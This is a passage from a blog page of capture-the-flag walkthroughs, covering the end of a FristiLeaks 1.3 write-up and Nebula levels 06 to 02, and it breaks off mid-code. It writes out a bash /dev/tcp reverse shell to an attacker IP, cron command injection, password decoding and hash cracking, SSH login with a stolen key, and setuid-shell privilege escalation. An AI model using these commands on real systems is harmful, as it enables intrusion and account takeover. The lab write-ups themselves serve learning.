+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/compromise/" rel="category tag">Compromise</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/passwords/" rel="category tag">Passwords</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/development/python/" rel="category tag">Python</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/fristileaks-1-3/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-321 -->
+
+				
+					
+	<article id="post-215" class="post-215 post type-post status-publish format-standard hentry category-brute-force category-crack category-exploit category-exploit-excercises category-hash category-infosec category-john-the-ripper category-linux category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-06/" rel="bookmark">Exploit Exercises – Nebula – Level 06</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-06/" title="11:59 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-29T23:59:23+00:00">2012-11-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-06/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Even less information about this one:</p>
+<p style="padding-left: 30px;">The flag06 account credentials came from a legacy unix system.<br>
+To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06.</p>
+<p>I had a good idea what I&#8217;m looking for here, an easy to crack password hash in /etc/passwd rather than in the shadow file, so:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>etc<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">passwd</span> <span style="color: #000000; font-weight: bold;">|</span> <span style="color: #c20cb9; font-weight: bold;">grep</span> flag06</pre></td></tr></table>
+<p class="theCode" style="display:none;">cat /etc/passwd | grep flag06</p>
+</div>
+
+<p>shows me the hash is ueqwOCnSGdsuM. I need to &#8220;crack&#8221; the hash. Time to get john the ripper on the case. At this point I didn&#8217;t have any other linux machines to hand, so I went to another tty session on this one and logged in a nebula and installed john (<strong>sudo apt-get install john</strong>). Then I ran john on the password file (<strong>john /etc/passwd</strong>) and he showed me the password. I switched over to flag06 account and the password worked as expected.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/hash/crack/brute-force/" rel="category tag">Brute Force</a>, <a href="/category/infosec/hash/crack/" rel="category tag">Crack</a>, <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/hash/" rel="category tag">Hash</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/infosec/hash/crack/john-the-ripper/" rel="category tag">John The Ripper</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-06/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-215 -->
+
+				
+					
+	<article id="post-210" class="post-210 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-php category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-05/" rel="bookmark">Exploit Exercises – Nebula – Level 05</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-05/" title="11:44 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-29T23:44:00+00:00">2012-11-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-05/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Not much information to start on this one:</p>
+<p style="padding-left: 30px;">Check the <em>flag05</em> home directory. You are looking for weak directory permissions<br>
+To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
+<p>The command <strong>ll</strong> (an alias for <strong>ls-alF</strong>) showed me that I had read access to ~flag05/.backup, and in there was a backup gzipped tar. Hopefully some goodies in here&#8230;</p>
+<p>I unpacked the tar and found that it contained a folder called .ssh. This is used for secure shell authentication. That folder contained a private/public key pair and an authorized_keys file. The authorised_keys file is exactly the same as the public key file, so (assuming that the authorised_keys file had not been deleted since the backup) I should be able to ssh in using the private key, as long as it was not encrypted with a passphrase.</p>
+<p>I copied the id_rsa file to ~/.ssh and tried to connect using:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">ssh</span> flag05<span style="color: #000000; font-weight: bold;">@</span>localhost</pre></td></tr></table>
+<p class="theCode" style="display:none;">ssh flag05@localhost</p>
+</div>
+
+<p>Bingo!</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-05/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-210 -->
+
+				
+					
+	<article id="post-206" class="post-206 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-04/" rel="bookmark">Exploit Exercises – Nebula – Level 04</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-04/" title="11:28 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-29T23:28:27+00:00">2012-11-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-04/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>The information about this level says:</p>
+<p style="padding-left: 30px;">This level requires you to read the <em>token</em> file, but the code restricts the files that can be read. Find a way to bypass it 🙂<br>
+To do this level, log in as the <em>level04</em> account with the password <em>level04</em> . Files for this level can be found in /home/flag04.</p>
+<p>It also contains some source code:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre></td>
+<td class="code"><pre class="c" style="font-family:monospace;"><span style="color: #339933;">#include &lt;stdlib.h&gt;</span>
+<span style="color: #339933;">#include &lt;unistd.h&gt;</span>
+<span style="color: #339933;">#include &lt;string.h&gt;</span>
+<span style="color: #339933;">#include &lt;sys/types.h&gt;</span>
+<span style="color: #339933;">#include &lt;stdio.h&gt;</span>
+<span style="color: #339933;">#include &lt;fcntl.h&gt;</span>
+&nbsp;
+<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>argv<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>envp<span style="color: #009900;">&#41;</span>
+<span style="color: #009900;">&#123;</span>
+    <span style="color: #993333;">char</span> buf<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1024</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+    <span style="color: #993333;">int</span> fd<span style="color: #339933;">,</span> rc<span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>argc <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;%s [file to read]<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+        <span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066;">strstr</span><span style="color: #009900;">&#40;</span>argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;token&quot;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">!=</span> NULL<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        <span style="color: #000066;">printf</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;You may not access '%s'<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+        <span style="color: #000066;">exit</span><span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    fd <span style="color: #339933;">=</span> open<span style="color: #009900;">&#40;</span>argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span> O_RDONLY<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>fd <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        err<span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Unable to open %s&quot;</span><span style="color: #339933;">,</span> argv<span style="color: #009900;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    rc <span style="color: #339933;">=</span> read<span style="color: #009900;">&#40;</span>fd<span style="color: #339933;">,</span> buf<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: #009900;">&#40;</span>buf<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span>rc <span style="color: #339933;">==</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        err<span style="color: #009900;">&#40;</span>EXIT_FAILURE<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Unable to read fd %d&quot;</span><span style="color: #339933;">,</span> fd<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    write<span style="color: #009900;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: #339933;">,</span> buf<span style="color: #339933;">,</span> rc<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    char buf[1024];
+    int fd, rc;
+
+    if(argc == 1) {
+        printf(&quot;%s [file to read]\n&quot;, argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    if(strstr(argv[1], &quot;token&quot;) != NULL) {
+        printf(&quot;You may not access '%s'\n&quot;, argv[1]);
+        exit(EXIT_FAILURE);
+    }
+
+    fd = open(argv[1], O_RDONLY);
+    if(fd == -1) {
+        err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
+    }
+
+    rc = read(fd, buf, sizeof(buf));
+
+    if(rc == -1) {
+        err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
+    }
+
+    write(1, buf, rc);
+}</p>
+</div>
+
+<p>Its fairly clear from looking at the files and the source code (I will admit I had to use a lot of <strong>man</strong> to help me understand the source code) that I want to read the contents of &#8220;token&#8221;, but the program won&#8217;t allow it. I tried things like <strong>./token</strong> and <strong>../flag04/token</strong>, but that didn&#8217;t work because the program is just searching for the string &#8220;token&#8221; anywhere in the first argument. Well&#8230; how do I get the contents of that file &#8220;into&#8221; another file without having permission to read the file? Symbolic link! Here&#8217;s what I did:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+</pre></td>
+<td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">ln</span> <span style="color: #660033;">-s</span> ~flag04<span style="color: #000000; font-weight: bold;">/</span>token <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">link</span>
+~flag04<span style="color: #000000; font-weight: bold;">/</span>flag04 <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span><span style="color: #c20cb9; font-weight: bold;">link</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">ln -s ~flag04/token /tmp/link
+~flag04/flag04 /tmp/link</p>
+</div>
+
+<p>It turns out that the contents of the token file is the password for the flag04 account so I just did su flag04 and used that password. I ran getflag and violà!</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-04/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-206 -->
+
+				
+					
+	<article id="post-198" class="post-198 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-03/" rel="bookmark">Exploit Exercises – Nebula – Level 03</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-03/" title="11:10 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-29T23:10:15+00:00">2012-11-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-03/#comments">5</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>The information about this level says:</p>
+<p style="padding-left: 30px;">Check the home directory of <em>flag03</em> and take note of the files there.<br>
+There is a crontab that is called every couple of minutes.<br>
+To do this level, log in as the <em>level03</em> account with the password <em>level03</em> . Files for this level can be found in /home/flag03.</p>
+<p>Well looking in ~flag03 there is just one directory (writable.d) file and one file (writable.sh). I&#8217;m assuming that the cron job runs writable.sh every couple of minutes so I looked at that script. I can see that the script runs every file in the writable.d folder (which we have write access to), but will kill the process if it takes longer than 5 seconds. It then removes the file.</p>
+<p>What we could do is make a quick bash script that will run getflag and save the output like this:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+</pre></td>
+<td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span>
+getflag <span style="color: #000000; font-weight: bold;">&gt;</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>getflag.out</pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/bin/sh
+getflag &gt; /tmp/getflag.out</p>
+</div>
+
+<p>Which works (after we wait for the cron job to run it), but I want shell! So we&#8217;re going to borrow a trick from level01 and create a program that will launch a bash shell and get flag03 to set the setuid bit.</p>
+<p>My C program looks like this:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td>
+<td class="code"><pre class="c" style="font-family:monospace;"><span style="color: #339933;">#define _GNU_SOURCE</span>
+<span style="color: #339933;">#include &lt;stdlib.h&gt;</span>
+<span style="color: #339933;">#include &lt;unistd.h&gt;</span>
+<span style="color: #339933;">#include &lt;sys/types.h&gt;</span>
+&nbsp;
+<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    gid_t gid<span style="color: #339933;">;</span>
+    uid_t uid<span style="color: #339933;">;</span>
+    gid <span style="color: #339933;">=</span> getegid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    uid <span style="color: #339933;">=</span> geteuid<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    setresgid<span style="color: #009900;">&#40;</span>gid<span style="color: #339933;">,</span> id<span style="color: #339933;">,</span> gid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    setresuid<span style="color: #009900;">&#40;</span>uid<span style="color: #339933;">,</span> uid<span style="color: #339933;">,</span> uid<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #000066;">system</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;/bin/bash&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main() {
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, id, gid);
+    setresuid(uid, uid, uid);
+
+    system(&quot;/bin/bash&quot;);
+}</p>
+</div>
+
+<p>Now I just compile it with gcc and drop it in /tmp so that flag03 can access it. All I need the cron job to do now is make a copy and set the setuid bit, so here is the script I dropped in ~flag03/writable.d:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+</pre></td>
+<td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span>
+<span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>setuidshell <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>setuidshell2
+<span style="color: #c20cb9; font-weight: bold;">chmod</span> u+s <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>setuidshell2</pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/bin/sh
+cp /tmp/setuidshell /tmp/setuidshell2
+chmod u+s /tmp/setuidshell2</p>
+</div>
+
+<p>This got me a program (/tmp/setuidshell2) in that gave me shell. From here I was able to run <strong>getflag</strong>, and also to run <strong>crontab -l</strong> to see that the cron job is actually called every 3 minutes.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/exploit-excercises/" rel="category tag">Exploit Excercises</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-03/#comments"><b>5</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-198 -->
+
+				
+					
+	<article id="post-165" class="post-165 post type-post status-publish format-standard hentry category-exploit category-exploit-excercises category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-02/" rel="bookmark">Exploit Exercises – Nebula – Level 02</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-02/" title="7:12 PM" rel="bookmark"><time class="entry-date" datetime="2012-11-29T19:12:56+00:00">2012-11-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-02/#comments">3</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>The information about this level says:</p>
+<p style="padding-left: 30px;">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>
+To do this level, log in as the <em>level02</em> account with the password <em>level02</em> . Files for this level can be found in /home/flag02.</p>
+<p>It also contains some source code:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td>
+<td class="code"><pre class="c" style="font-family:monospace;"><span style="color: #339933;">#include &lt;stdlib.h&gt;</span>
+<span style="color: #339933;">#include &lt;unistd.h&gt;</span>
+<span style="color: #339933;">#include &lt;string.h&gt;</span>
+<span style="color: #339933;">#include &lt;sys/types.h&gt;</span>
+<span style="color: #339933;">#include &lt;stdio.h&gt;</span>
+&nbsp;
+<span style="color: #993333;">int</span> main<span style="color: #009900;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>argv<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>envp<span style="color: #009900;">&#41;</span>
+<span style="color: #009900;">&#123;</span>
+    <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>buffer<span style="color: #339933;">;</span>
+&nbsp;
+    gid_t gid<span style="color: #339933;">;</span>
+    uid_t uid<span style="color: #339933;">;</span>
+&nbsp;
